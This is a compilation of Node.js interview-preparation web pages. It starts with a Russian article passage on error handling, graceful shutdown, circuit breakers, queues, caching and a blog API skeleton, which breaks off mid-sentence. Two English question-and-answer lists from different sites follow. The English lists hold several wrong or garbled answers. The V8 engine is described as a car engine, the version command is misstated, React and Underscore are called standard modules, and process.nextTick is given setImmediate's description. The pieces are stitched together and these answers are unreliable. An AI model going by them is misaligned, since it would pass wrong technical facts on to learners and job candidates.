4
5
6
7
8
9
10
11
12
// Глобальные обработчики ошибок
process.on('uncaughtException', (err) => {
  console.error('Необработанное исключение:', err);
  // Сохранение диагностической информации, уведомление
  
  // Корректное завершение процесса после обработки всех запросов
  gracefulShutdown();
});
 
process.on('unhandledRejection', (reason, promise) => {
  console.error('Необработанный reject промиса:', reason);
});
2. Автоматический перезапуск упавших процессов с PM2:
BashСкопировано
1
2
3
4
5
6
7
8
# Установка PM2
npm install pm2 -g
 
# Запуск приложения с автоперезапуском
pm2 start app.js --name "my-app" --max-memory-restart 300M
 
# Кластерный режим для отказоустойчивости и балансировки
pm2 start app.js -i max
3. Graceful shutdown — корректное завершение работы:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
function gracefulShutdown() {
  console.log('Запуск корректного завершения');
  
  // Прекратить принимать новые запросы
  server.close(() => {
    console.log('HTTP сервер закрыт');
    
    // Закрыть соединения с БД
    mongoose.connection.close(() => {
      console.log('Соединения с БД закрыты');
      process.exit(0);
    });
  });
  
  // Если не удалось завершить за 10 секунд, принудительное завершение
  setTimeout(() => {
    console.error('Принудительное завершение!');
    process.exit(1);
  }, 10000);
}
 
// Обработка сигналов от OS
process.on('SIGTERM', gracefulShutdown);
process.on('SIGINT', gracefulShutdown);
4. Circuit Breaker — паттерн для предотвращения каскадных отказов:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
const CircuitBreaker = require('opossum');
 
// Создание circuit breaker для внешнего API
const breaker = new CircuitBreaker(callExternalAPI, {
  timeout: 3000,           // Таймаут операции
  errorThresholdPercentage: 50,  // % ошибок перед размыканием
  resetTimeout: 10000      // Время до повторной попытки
});
 
// Обработка событий
breaker.on('open', () => console.log('Circuit Breaker открыт'));
breaker.on('close', () => console.log('Circuit Breaker закрыт'));
breaker.on('halfOpen', () => console.log('Circuit Breaker полуоткрыт'));
breaker.on('fallback', () => console.log('Использую запасной вариант'));
 
// Использование
app.get('/api/data', async (req, res) => {
  try {
    const result = await breaker.fire(req.query.id);
    res.json(result);
  } catch (err) {
    // Обработка ошибки или использование fallback
    res.status(503).json({ error: 'Сервис временно недоступен' });
  }
});
5. Использование очередей для критически важных операций:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
// Повторная отправка при сбое
const amqp = require('amqplib');
 
async function sendToQueue(data, maxRetries = 3) {
  let retries = 0;
  
  async function attempt() {
    try {
      const connection = await amqp.connect('amqp://localhost');
      const channel = await connection.createChannel();
      
      await channel.assertQueue('important_queue', { durable: true });
      channel.sendToQueue('important_queue', Buffer.from(JSON.stringify(data)), {
        persistent: true  // Сообщение сохранится даже при перезапуске RabbitMQ
      });
      
      await channel.close();
      await connection.close();
    } catch (err) {
      console.error(`Ошибка при отправке (попытка ${retries + 1}):`, err);
      
      if (++retries < maxRetries) {
        // Экспоненциальная выдержка между попытками
        const delay = Math.pow(2, retries) * 1000;
        console.log(`Повторная попытка через ${delay}мс`);
        setTimeout(attempt, delay);
      } else {
        console.error('Максимальное число попыток исчерпано');
        throw err;
      }
    }
  }
  
  return attempt();
}
Мой самый яркий опыт связан с системой обработки платежей, когда мы запустили приложение без настройки graceful shutdown. Перезапуск сервера во время активных транзакций привел к дублированным платежам — повезло, что у нас была хорошая система логирования, и мы смогли отменить лишние списания. С тех пор корректное завершение процесса — первое, что я настраиваю в новых проектах.

Нестандартные вопросы и задачи с примерами кода

Иногда на собеседованиях встречаются вопросы, которые не найдёшь в стандартных списках. Они проверяют не знание API, а понимание внутренних механизмов Node.js и способность нестандартно мыслить. Давайте рассмотрим несколько таких задач.

Создание кастомного middleware для измерения времени выполнения запроса

Интервьюеры любят просить написать собственный middleware, например, для измерения производительности:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
function responseTimeMiddleware(req, res, next) {
  // Сохраняем время начала запроса
  const start = process.hrtime();
  
  // Отлавливаем событие окончания запроса
  res.on('finish', () => {
    // Получаем время в наносекундах и переводим в миллисекунды
    const diff = process.hrtime(start);
    const responseTime = diff[0] * 1000 + diff[1] / 1000000;
    
    console.log(`Запрос ${req.method} ${req.url} обработан за ${responseTime.toFixed(2)} мс`);
    
    // В реальном приложении здесь можно отправлять метрики
    // в систему мониторинга типа Prometheus
  });
  
  next();
}
 
// Использование
app.use(responseTimeMiddleware);
Я как-то собеседовал кандидата, который создал подобный middleware, но забыл вызвать next(). Классическая ошибка! Все запросы просто зависли, никогда не доходя до обработчиков. Поэтому всегда проверяйте flow в middleware.

Задача на управление памятью: создание сборщика мусора для кэша

А вот задача посложнее — реализовать самоочищающийся кэш с защитой от утечек памяти:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
class AutoCleanCache {
  constructor(maxSize = 100, cleanInterval = 60000) {
    this.cache = new Map();
    this.maxSize = maxSize;
    this.lastAccessed = new Map(); // Время последнего доступа
    
    // Запуск автоочистки
    this.cleanIntervalId = setInterval(() => this.cleanOldEntries(), cleanInterval);
    
    // Не забываем очистить интервал при выгрузке модуля
    process.on('beforeExit', () => {
      clearInterval(this.cleanIntervalId);
    });
  }
  
  set(key, value, ttl = 3600000) { // По умолчанию 1 час
    // Контроль размера кэша
    if (this.cache.size >= this.maxSize) {
      this.removeOldest();
    }
    
    this.cache.set(key, {
      value,
      expires: Date.now() + ttl
    });
    this.updateAccessTime(key);
  }
  
  get(key) {
    const entry = this.cache.get(key);
    
    if (!entry) return null;
    
    // Проверка на истекшее время жизни
    if (entry.expires < Date.now()) {
      this.cache.delete(key);
      this.lastAccessed.delete(key);
      return null;
    }
    
    this.updateAccessTime(key);
    return entry.value;
  }
  
  updateAccessTime(key) {
    this.lastAccessed.set(key, Date.now());
  }
  
  removeOldest() {
    // Находим самую старую запись
    let oldestKey = null;
    let oldestTime = Infinity;
    
    for (const [key, accessTime] of this.lastAccessed.entries()) {
      if (accessTime < oldestTime) {
        oldestTime = accessTime;
        oldestKey = key;
      }
    }
    
    if (oldestKey) {
      this.cache.delete(oldestKey);
      this.lastAccessed.delete(oldestKey);
    }
  }
  
  cleanOldEntries() {
    const now = Date.now();
    
    // Удаляем истекшие записи
    for (const [key, entry] of this.cache.entries()) {
      if (entry.expires < now) {
        this.cache.delete(key);
        this.lastAccessed.delete(key);
      }
    }
  }
}
 
// Использование
const cache = new AutoCleanCache(1000, 30000);
cache.set('user:1', { name: 'John' });
В одном проекте мне пришлось разрабатывать подобный кэш, когда стандартные решения не справлялись с нашими специфическими требованиями. Такие задачи на собеседовании выявляют понимание управления памятью и асинхронностью в Node.js — критически важных навыков для опытного разработчика.

Заключение: рекомендации по подготовке к собеседованию

Собеседования по Node.js — настоящие американские горки для большинства разработчиков. Как человек, побывавший по обе стороны баррикад, поделюсь несколькими проверенными в бою советами:
1. Прокачайте фундамент. Асинхронность, Event Loop, буферы, стримы — не просто выучите определения, а поймите, как они работают внутри. Собеседования редко остаются на поверхности, копают глубоко.
2. Пишите код каждый день. Решайте алгоритмические задачи на LeetCode и HackerRank, но с фокусом на Node.js-специфичные особенности — асинхронность, работу с потоками данных, управление памятью.
3. Ведите дневник ошибок. Каждый баг, каждая головоломка, с которой вы сталкиваетесь — это потенциальный вопрос на собеседовании. Записывайте проблемы и решения.
4. Создайте тестовый проект. Мини-приложение, где вы имплементируете различные паттерны и практики, упомянутые в этой статье. Реальный код говорит громче отрепетированных ответов.
5. Делайте code review. Разбирайте чужой код в open-source проектах — это откроет глаза на многообразие подходов к решению одних и тех же задач.
Помните, что лучшие кандидаты — не те, кто знает все ответы, а те, кто умеет структурировано мыслить и не боится признать, когда чего-то не знают. Удачи вам на следующем собеседовании — воспринимайте его как возможность поучиться, а не испытание.

Пример полного рабочего приложения на Node.js

Давайте соединим вместе все концепции, которые мы разобрали, и создадим полное рабочее приложение. Это будет API сервер для блога с аутентификацией, обработкой статей и комментариев, а также WebSocket уведомлениями о новых комментариях. Структура проекта:

JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
blog-api/
├── config/
│   ├── database.js
│   └── jwt.js
├── controllers/
│   ├── articlesController.js
│   └── authController.js
├── middleware/
│   ├── auth.js
│   └── errorHandler.js
├── models/
│   ├── Article.js
│   └── User.js
├── routes/
│   ├── articles.js
│   └── auth.js
├── utils/
│   ├── cache.js
│   └── logger.js
├── app.js
├── server.js
└── package.json
Начнем с базовых файлов:

package.json
JSONСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
{
  "name": "blog-api",
  "version": "1.0.0",
  "description": "Node.js блог API с JWT и WebSocket",
  "main": "server.js",
  "scripts": {
    "start": "node server.js",
    "dev": "nodemon server.js"
  },
  "dependencies": {
    "bcrypt": "^5.1.0",
    "cors": "^2.8.5",
    "dotenv": "^16.0.3",
    "express": "^4.18.2",
    "express-rate-limit": "^6.7.0",
    "helmet": "^6.1.0",
    "jsonwebtoken": "^9.0.0",
    "mongoose": "^7.0.3",
    "morgan": "^1.10.0",
    "redis": "^4.6.5",
    "socket.io": "^4.6.1",
    "winston": "^3.8.2"
  },
  "devDependencies": {
    "nodemon": "^2.0.22"
  }
}
server.js - точка входа, запускает сервер:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
require('dotenv').config();
const http = require('http');
const app = require('./app');
const { Server } = require('socket.io');
const mongoose = require('mongoose');
const logger = require('./utils/logger');
const { connectDatabase } = require('./config/database');
 
// Создаем HTTP-сервер
const server = http.createServer(app);
 
// Настройка Socket.IO
const io = new Server(server, {
  cors: {
    origin: process.env.FRONTEND_URL || 'http://localhost:3000',
    methods: ['GET', 'POST']
  }
});
 
// Глобально делаем io доступным для использования в других модулях
app.set('io', io);
 
// WebSocket обработка
io.on('connection', (socket) => {
  logger.info(`Новое WebSocket соединение: ${socket.id}`);
  
  socket.on('join article', (articleId) => {
    socket.join(`article:${articleId}`);
    logger.info(`Клиент ${socket.id} присоединился к комнате article:${articleId}`);
  });
  
  socket.on('disconnect', () => {
    logger.info(`WebSocket соединение закрыто: ${socket.id}`);
  });
});
 
// Подключение к базе данных
connectDatabase();
 
// Запуск сервера
const PORT = process.env.PORT || 5000;
server.listen(PORT, () => {
  logger.info(`Сервер запущен на порту ${PORT}`);
});
 
// Graceful shutdown
const shutdown = async () => {
  logger.info('Получен сигнал на завершение работы');
  
  // Закрываем сервер, прекращаем принимать новые соединения
  server.close(() => {
    logger.info('HTTP сервер закрыт');
    
    // Закрываем подключение к MongoDB
    mongoose.connection.close(false, () => {
      logger.info('Соединение с MongoDB закрыто');
      process.exit(0);
    });
  });
  
  // Если сервер не закрылся за 10 секунд, принудительно завершаем процесс
  setTimeout(() => {
    logger.error('Принудительное завершение через таймаут');
    process.exit(1);
  }, 10000);
};
 
// Обработка сигналов завершения
process.on('SIGTERM', shutdown);
process.on('SIGINT', shutdown);
 
// Обработка необработанных исключений и rejected промисов
process.on('uncaughtException', (error) => {
  logger.error('Необработанное исключение:', error);
  shutdown();
});
 
process.on('unhandledRejection', (reason, promise) => {
  logger.error('Необработанный reject промиса:', reason);
});
app.js - настройка Express приложения:
JavaScriptСкопировано
1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
const express = require('express');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const rateLimit = require('express-rate-limit');
const errorHandler = require('./middleware/errorHandler');
const authRoutes = require('./routes/auth');
const articleRoutes = require('./routes/articles');
 
const app = express();
 
// Базовые middleware
app.use(helmet());  // Безопасные HTTP-заголовки
app.use(cors());    // Разрешаем кросс-доменные запросы
app.use(express.json());  // Парсинг JSON в req.body
app.use(morgan('dev'));   // Логирование запросов
 
// Ограничение количества запросов (защита от DDoS)
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000,  // 15 минут
  max: 100,  // 100 запросов с одного IP
  standardHeaders: true,
  legacyHeaders: false
});
app.use(limiter);
 
// Маршруты
app.use('/api/auth', authRoutes);
app.use('/api/articles', articleRoutes);
 
// Проверка работоспособности
app.get('/health', (req, res) => {
  res.status(200).json({ status: 'ok' });
});
 
// Обработка ошибок
app.use(errorHandler);
 
module.exports = app;
Это базовый каркас нашего приложения. В полной версии нам понадобятся также контроллеры, модели и middleware. Такое приложение демонстрирует важные концепции Node.js, включая асинхронную обработку, масштабирование и безопасность.
В нём я использовал несколько важных паттернов:
Разделение настроек сервера (server.js) и приложения (app.js) для облегчения тестирования.
Graceful shutdown для корректного завершения работы.
Обработка ошибок на уровне процесса.
WebSocket для коммуникации в реальном времени.
Маршрутизация и middleware.
Расширять такое приложение легко — до

Node JS Interview Question
Last updated on Jan 09, 2024

author-image
by Amani
Node JS is a powerful JavaScript framework that enables developers to create scalable network applications. As such, Node JS is becoming increasingly popular, and accordingly, interviewers are starting to ask more questions about it. This article provides a list of some common Node JS interview questions, which will help you prepare for your next interview.

Most Frequently Asked Node JS Interview Questions and Answers
Is Nodejs a language or a framework?
How can Node.js be used?
Explain Modules in Node Js.
Is Node Js Single – threaded?
Explain the event loop in Node js.
What is Dispatcher?
Explain what a javascript engine is.
Conclusion
Can you tell me if Nodejs is Synchronous or Asynchronous?
Node.js is an event-driven asynchronous JavaScript runtime. It is intended for the development of scalable network applications. Because of its asynchronous nature, Node.js is very efficient in handling multiple concurrent connections.

Can you explain how Node js handles multiple requests concurrently despite being Single-. threaded?
It can handle multiple requests concurrently because of its event-driven, non-blocking I/O model. Node.js can process requests as they come in without waiting for each request to finish before starting on the next one.

Node.js uses a thread pool to handle certain types of tasks that are computationally intensive or blocking.


Is Nodejs a language or a framework?
Node.js is a programming platform that enables developers to create network and server-side applications. Node.js apps are developed in Javascript and run in the Node.js runtime on S X, Linux and MS Windows.' Java Script modules that are used to create various applications.

What are the benefits of using Node.js?
There are many benefits to using Node.js, including the following:

Node.js is fast.
Node.js is lightweight.
Node.js is scalable.
Iv.  Node.js is easy to learn.
What is the difference between Node. Js and Javascript?
Node.js allows you to run javascript on the server side, whereas java script is primarily used for client-side scripting in web browsers.

What are some of the key features of Node? Js?
It is an open-source, cross-platform runtime environment that allows developers to create server-side applications in javascript.
It has a unique architecture that makes it lightweight and efficient.
The applications are written in javascript and can be run on any platform that supports Node.js.
Node.js is used by some of the biggest companies in the world, such as Netflix, Uber, and Linkedin.

How can Node.js be used?
Node.js can be used for various purposes; such s building web applications, creating APIs, or working with real-time data. In terms of web applications, Node.js is often used with the Express.js framework to create server-side applications. Node.js frameworks are used with the Express.js frameworks.

Explain V8 Engine
The V8 engine is a type of internal combustion engine typically used in high–performance vehicles. It is named after the eight cylinders arranged in two banks of four, typically in a "V" configuration. The V8 engine is more powerful compared to other engines.

Learn Node JS Training
Node JS Training
 Master Your Craft  Lifetime LMS & Faculty Access  24/7 online expert support  Real-world & Project Based Learning
How do you determine the Node Js version that is installed?
You can determine the version of node js that is installed by running the following command:

Node – V

The output is the current Node version installed on your system.

. What is NPM?
NPM is the short form for Node Package Manager. NPM is a package for Java Script. It is used to install, update and uninstall packages for your projects. It is also used to manage dependencies between packages.


. Explain Modules in Node Js.
Modules are the heart of node.js. When you include a module, you include a set of functions, objects, and variables available to your application. Each module has its namespace, meaning the module's code is separate from the rest of your application code.

. What are standard Js modules?
There are many standard JS modules available, including:

Underscore
Async
Request
React
. For what requirement () is Node Js?
The Require() function is used to load modules in Node.js. The module is a javascript library used in a Node.js application. A module is loaded and placed in the cache so that it is reused the next time it is required. 

. Explain module. Exports in Node js
Module. Export is a particular object in Node.js that exposes modules and their functionality to the outside world. In other words, it allows you to include a module in your application and make it available.

The most common use case for the module. Exports expose a constructor function or class for instantiation via require().


. Is Node Js Single – threaded?
Yes, Node.js is a single-threaded platform. It uses a single event loop to process all incoming requests. While this may seem like a bottleneck, it allows Node.js to be very efficient with resources.

. Explain the Event loop in Node Js.
The event loop is a mechanism used by Node. It works by allowing Node.js to handle many concurrent connections with very little overhead.

 Become a Node JS Certified professional by learning this HKR Node JS Training !

HKR Trainings Logo
Subscribe to our YouTube channel to get new updates..!
. What are events in Node js?
Events are an essential part of Node.js. They provide a way for different parts of the system to communicate.

Node.js has a built-in "events" module that allows you to work with events. The event emitter class is used to blind and trigger events.


. Explain the event loop in Node js.
The Event Loop allows Node.js to do non–blocking I/O action operations even though the single-threaded javascript.

The event loop works by allowing Node.js to register certain events in advance.

. Difference between cluster and child process modules.
The cluster module allows you to create child processes that all share the underlying server port. It can be careful to increase the performance of Node.js applications by taking advantage of multiple cores.
The child process module allows you to spawn new processes, execute external programs and perform other system-related tasks.

. How to stop the controller process without suspending all of its child processes?
The best way to stop a controller process without suspending all child processes is to use the kill command. The kill command can send a signal to a process, which can then be caught and used to terminate it gracefully.

. What does Emitter do?
An emitter is a tool that helps you to create and manage events. It is used to create custom events and event handlers.


. What is Dispatcher?
The dispatcher is a software component responsible for handling the communication between various software components in a computer system. It acts as an intermediary between the different components and ensures that the data is transferred smoothly and efficiently. 

. What are the features of Express.js?
The key features of Express.js include:

Robust routing.
HTTP helpers.
View system
Query string parsing.
Cookie parsing.
Session management.
Static file serving.
Error handling.
. Explain the ECMA script.
ECMA script is an ECMA international standardized scripting language specification. It was created to standardize javascript to foster multiple independent implementations. 

. Who is the author of Node js?
Joyent Software Engineer Ryan Dahl created the open-source project node.js.

. Explain CLI Node.js.
Command Line Interface is a text-based interface that views, changes, or controls a computer system. It allows users to interact with a computer by typing commands into a text  interface. A CLI can run programs, open files and interact with system services.

Node JS Training
Weekday / Weekend Batches


. Explain what a javascript engine is.
A javascript is a program that interprets and executes javascript code. The most common java script engine is the javascript interpreter in web browsers. Other engines included the V8 javascript engine in google chrome and Node.js and the spider monkey engine used in Mozilla Firefox.

. What is the difference between blocking and asynchronous IO?
Blocking IO is where the process requesting data must wait for that data to become available before it can continue. It can be problematic if the IO operation takes a long time, as it can cause the process to block for an extended period. It is contrasted with asynchronous IO, where the requesting process can continue with other tasks while it waits for the data to become available.

. Explain String data types in Node.js.
The string data type Node.js is a primitive data type that represents a sequence of characters. Node js also supports template literals, which allow you to create strings that include interpolated values.

. Explain the number data type in Node.js.
The number data type in Node.js represents a double-precision 64-bit binary number. It is used to represent both integer and floating point numbers. The number data type can represent positive or negative values.

The number data type is a double-precision 64-bit binary number. Node.js does not have a separate integer data type.


Conclusion
These questions are designed to help you better understand Node JS and what it can do for your business. With these questions, you should be able to get a feel for the potential this technology has. If you're looking to get started with Node JS, be sure to check out our other resources to get the most out of this powerful tool.

Top 50 Node.Js Interview Questions and Answers
Node JS
Rajesh Kumar
·
February 11, 2022
·
0 Comment
What is Node.js? Where can you use it?
Introduction to the Node.js reference architecture, Part 1: Overview | Red  Hat Developer
Node.Js
Node.js is an open-source, cross-platform JavaScript runtime environment and library to run web applications outside the client’s browser. It is used to create server-side web applications.

Node.js is perfect for data-intensive applications as it uses an asynchronous, event-driven model. You can use I/O intensive web applications like video streaming sites. You can also use it for developing: Real-time web applications, Network applications, General-purpose applications, and Distributed systems.

2. Why use Node.js?

Node.js makes building scalable network programs easy. Some of its advantages include:

It is generally fast
It rarely blocks
It offers a unified programming language and data type
Everything is asynchronous
It yields great concurrency

3. How does Node.js work?
A web server using Node.js typically has a workflow that is quite similar to the diagram illustrated below. Let’s explore this flow of operations in detail.

Clients send requests to the webserver to interact with the web application. Requests can be non-blocking or blocking:
Querying for data
Deleting data
Updating the data
Node.js retrieves the incoming requests and adds those to the Event Queue
The requests are then passed one-by-one through the Event Loop. It checks if the requests are simple enough not to require any external resources
The Event Loop processes simple requests (non-blocking operations), such as I/O Polling, and returns the responses to the corresponding clients.
A single thread from the Thread Pool is assigned to a single complex request. This thread is responsible for completing a particular blocking request by accessing external resources, such as computation, database, file system, etc.

Once the task is carried out completely, the response is sent to the Event Loop that sends that response back to the client.

3. Why is Node.js Single-threaded?

Node.js is single-threaded for async processing. By doing async processing on a single-thread under typical web loads, more performance and scalability can be achieved instead of the typical thread-based implementation.

4. If Node.js is single-threaded, then how does it handle concurrency?

The Multi-Threaded Request/Response Stateless Model is not followed by the Node JS Platform, and it adheres to the Single-Threaded Event Loop Model. The Node JS Processing paradigm is heavily influenced by the JavaScript Event-based model and the JavaScript callback system. As a result, Node.js can easily manage more concurrent client requests. The event loop is the processing model’s beating heart in Node.js.

5. Explain callback in Node.js?

A callback function is called after a given task. It allows other code to be run in the meantime and prevents any blocking. Being an asynchronous platform, Node.js heavily relies on callback. All APIs of Node are written to support callbacks.

6. What are the advantages of using promises instead of callbacks?

The control flow of asynchronous logic is more specified and structured.
The coupling is low.
We’ve built-in error handling.
Improved readability.

7. How would you define the term I/O?

The term I/O is used to describe any program, operation, or device that transfers data to or from a medium and to or from another medium.
Every transfer is an output from one medium and an input into another. The medium can be a physical device, network, or files within a system.
8. How is Node.js most frequently used?

Node.js is widely used in the following applications:

Real-time chats
Internet of Things
Complex SPAs (Single-Page Applications)
Real-time collaboration tools
Streaming applications
Microservices architecture
9. Explain the difference between frontend and backend development?

Front-end	Back-end
Frontend refers to the client-side of an application	Backend refers to the server-side of an application
It is the part of a web application that users can see and interact with	It constitutes everything that happens behind the scenes
It typically includes everything that attributes to the visual aspects of a web application	It generally includes a web server that communicates with a database to serve requests
HTML, CSS, JavaScript, AngularJS, and ReactJS are some of the essentials of frontend development	Java, PHP, Python, and Node.js are some of the backend development technologies
10. What is NPM?


NPM
NPM stands for Node Package Manager, responsible for managing all the packages and modules for Node.js

Node Package Manager provides two main functionalities:

Provides online repositories for node.js packages/modules, which are searchable on search.nodejs.org
Provides command-line utility to install Node.js packages and also manages Node.js versions and dependencies.
11. How do you manage packages in your node.js project?

It can be managed by a number of package installers and their configuration file accordingly. Out of them mostly use npm or yarn. Both provide almost all libraries of javascript with extended features of controlling environment-specific configurations. To maintain versions of libs being installed in a project we use package.json and package-lock.json so that there is no issue in porting that app to a different environment.

12. How is Node.js better than other frameworks most popularly used?

Node.js provides simplicity in development because of its non-blocking I/O and even-based model results in short response time and concurrent processing, unlike other frameworks where developers have to use thread management.
It runs on a chrome v8 engine which is written in c++ and is highly performant with constant improvement.
Also since we will use Javascript in both the frontend and backend the development will be much faster.
And at last, there are ample libraries so that we don’t need to reinvent the wheel.
13. Explain the steps how “Control Flow” controls the functions calls?

How “Control Flow” controls the functions calls? | Mocamboo.com
how control flow control the function calls
Control the order of execution
Collect data
Limit concurrency
Call the following step in the program
14. What are some commonly used timing features of Node.js?

setTimeout/clearTimeout – This is used to implement delays in code execution.
setInterval/clearInterval – This is used to run a code block multiple times.
setImmediate/clearImmediate – Any function passed as the setImmediate() argument is a callback that’s executed in the next iteration of the event loop.
process.nextTick – Any function passed as the setImmediate() argument is a callback that’s executed in the next iteration of the event loop.
15. What is fork in node JS?

A fork in general is used to spawn child processes. In node it is used to create a new instance of v8 engine to run multiple workers to execute the code.

16. How do you create a simple server in Node.js that returns Hello World?

__________________________________________

JavaScript
var http = require("http");
http.createServer(function (request, response) {
response.writeHead(200, {'Content-Type': 'text/plain'});
response.end('Hello World\n');
}).listen(3000);
Code language: JavaScript (javascript)
___________________________________________

17. How many types of API functions are there in Node.js?


API functions are available in Nodes.Js
There are two types of API functions:

Asynchronous, non-blocking functions – mostly I/O operations which can be fork out of the main loop.
Synchronous, blocking functions – mostly operations that influence the process running in the main loop.
18. What is REPL?

PL in Node.js stands for Read, Eval, Print, and Loop, which further means evaluating code on the go.

19. List down the two arguments that async.queue takes as input?

Task Function
Concurrency Value
20. What is the purpose of module.exports?

This is used to expose functions of a particular module or file to be used elsewhere in the project. This can be used to encapsulate all similar functions in a file which further improves the project structure.

For example, you have a file for all utils functions with util to get solutions in a different programming language of a problem statement.

_______________________________________________________

const getSolutionInJavaScript = async ({
problem_id
}) => {
…
};
const getSolutionInPython = async ({
problem_id
}) => {
…
};
module.exports = { getSolutionInJavaScript, getSolutionInPython }

___________________________________________________________

Thus using module.exports we can use these functions in some other file:

_____________________________________________________

JavaScript
const { getSolutionInJavaScript, getSolutionInPython} = require("./utils")
________________________________________

Code language: JavaScript (javascript)
21. What tools can be used to assure consistent code style?

ESLint can be used with any IDE to ensure a consistent coding style which further helps in maintaining the codebase.

22. What do you understand by callback hell?

______________________________________________

JavaScript
async_A(function(){
   async_B(function(){
       async_C(function(){
           async_D(function(){
           ....
           });
       });
   });
});
____________________________________
Code language: JavaScript (javascript)
For the above example, we are passing callback functions and it makes the code unreadable and not maintainable, thus we should change the async logic to avoid this.

23. If Node.js is single threaded then how does it handle concurrency?

The main loop is single-threaded and all async calls are managed by libuv library.

For example:

_________________________________________________

JavaScript
const crypto = require("crypto");
const start = Date.now();
function logHashTime() {
 crypto.pbkdf2("a", "b", 100000, 512, "sha512", () => {
console.log("Hash: ", Date.now() - start);
 });
}
logHashTime();
logHashTime();
logHashTime();
logHashTime();
_____________________________________
Code language: JavaScript (javascript)
This gives the output:

_______________________________________

Hash: 1213
Hash: 1225
Hash: 1212
Hash: 1222
_________________________________
This is because libuv sets up a thread pool to handle such concurrency. How many threads will be there in the thread pool depends upon the number of cores but you can override this.

24. How does Node.js overcome the problem of blocking of I/O operations?

Since the node has an event loop that can be used to handle all the I/O operations in an asynchronous manner without blocking the main function.

So for example, if some network call needs to happen it will be scheduled in the event loop instead of the main thread(single thread). And if there are multiple such I/O calls each one will be queued accordingly to be executed separately(other than the main thread).

Thus even though we have single-threaded JS, I/O ops are handled in a nonblocking way.

25. How can we use async await in node.js?

Here is an example of using async-await pattern:

_________________________________________________________

JavaScript
// this code is to retry with exponential backoff
function wait (timeout) {
 return new Promise((resolve) => {
setTimeout(() => {
  resolve()
}, timeout);
 });
}
async function requestWithRetry (url) {
 const MAX_RETRIES = 10;
 for (let i = 0; i <= MAX_RETRIES; i++) {
try {
  return await request(url);
} catch (err) {
  const timeout = Math.pow(2, i);
  console.log('Waiting', timeout, 'ms');
  await wait(timeout);
  console.log('Retrying', err.message, i);
}
 }
}
_______________________________________________
Code language: JavaScript (javascript)
26. What are node.js buffers?

In general, buffers is a temporary memory that is mainly used by stream to hold on to some data until consumed. Buffers are introduced with additional use cases than JavaScript’s Unit8Array and are mainly used to represent a fixed-length sequence of bytes. This also supports legacy encodings like ASCII, utf-8, etc. It is a fixed(non-resizable) allocated memory outside the v8.

27. Describe the exit codes of Node.js?

Exit codes give us an idea of how a process got terminated/the reason behind termination.

A few of them are:

Uncaught fatal exception – (code – 1) – There has been an exception that is not handled
Unused – (code – 2) – This is reserved by bash
Fatal Error – (code – 5) – There has been an error in V8 with stderr output of the description
Internal Exception handler Run-time failure – (code – 7) – There has been an exception when bootstrapping function was called
Internal JavaScript Evaluation Failure – (code – 4) – There has been an exception when the bootstrapping process failed to return function value when evaluated.
28. What is a thread pool and which library handles it in Node.js?

The Thread pool is handled by the libuv library. libuv is a multi-platform C library that provides support for asynchronous I/O-based operations such as file systems, networking, and concurrency.

29. Differentiate between JavaScript and Node.js.?

Features	JavaScript	Node.Js
Type	Programming language	Interpreter and environment for JavaScript
Utility	Used for any client-side activity for a web application	Used for accessing or performing any non-blocking operation of any operating system
Running Engine	Spider monkey (FireFox), JavaScript Core (Safari), V8 (Google Chrome), etc	V8 (Google Chrome)
30. What is the difference between Angular and Node.js?

Angular	Node.Js
It is an open source web application development framework	It is a cross-platform run-time environment for applications
It is written in TypeScript	It is written in C, C++ and JavaScript languages
Used for building single-page client-side web applications	Used for building fast and scalable server-side networking applications
Angular itself is a web application framework	Node.js has many different frameworks like Sails.js, Partial.js, and Express.js, etc.
Ideal for creating highly active and interactive web apps	Ideal for developing small size projects
Helpful in splitting an app into MVC components	Helpful in generating database queries
Suitable for developing real-time applications	Suitable in situations where something faster and more scalable is required
31. How do Node.js works?

Node.js is a virtual machine that uses JavaScript as its scripting language and runs on a v8 environment. It works on a single-threaded event loop and a non-blocking I/O which provides high rate as it can handle a higher number of concurrent requests. Also, by making use of the ‘HTTP’ module, Node.js can run on any stand-alone web server.

32. Where Node.js can be used?

Node.js can be used to develop:

Real-Time Web Applications
Network Applications
Distributed Systems
General Purpose Applications
33. What do you understand by Event-driven programming?

PPT - Event-Driven Programming PowerPoint Presentation, free download -  ID:5316579
Event-driven programming is an approach that heavily makes use of events for triggering various functions. An event can be anything like a mouse click, key press, etc. When an event occurs, a call back function is executed that is already registered with the element. This approach mainly follows the publish-subscribe pattern. Because of event-driven programming, Node.js is faster when compared to other technologies.

34. Explain REPL in the context of Node.js.?

REPL in Node.js stands for Read, Eval, Print, and Loop. It represents a computer environment such as a window console or Unix/Linux shell where any command can be entered and then the system can respond with an output. Node.js comes bundled with a REPL environment by default. REPL can perform the below-listed tasks:

Read: Reads the user’s input, parses it into JavaScript data-structure and then stores it in the memory.
Eval: Receives and evaluates the data structure.
Print: Prints the final result.
Loop: Loops the provided command until CTRL+C is pressed twice.

35. List down the steps using which “Control Flow” controls the function calls in Node.js?

Control the order of execution
Collect data
Limit concurrency
Call the next step in the program
